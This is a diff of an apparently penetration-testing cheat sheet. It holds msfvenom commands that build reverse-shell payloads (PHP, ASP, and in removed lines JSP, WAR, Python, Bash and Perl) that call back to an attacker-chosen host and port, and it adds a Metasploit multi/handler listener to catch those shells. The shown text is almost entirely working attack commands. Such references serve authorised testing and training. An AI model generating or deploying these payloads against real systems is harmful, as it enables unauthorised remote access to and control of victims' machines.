@@ -113,25 +113,12 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Numb
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
 ```
 
-#### JSP(msfvenom)
-```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
-```
 
-#### WAR(msfvenom)
+#### Handlers
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
-```
-
-#### Python(msfvenom)
-```
-msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
-```
-#### Bash(msfvenom) 
-```
-msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
-```
-#### Perl(msfvenom)
-```
-msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
+use exploit/multi/handler
+set payload <payload>
+set LHOST <ip address>
+set LPORT <port number>
+run
 ```
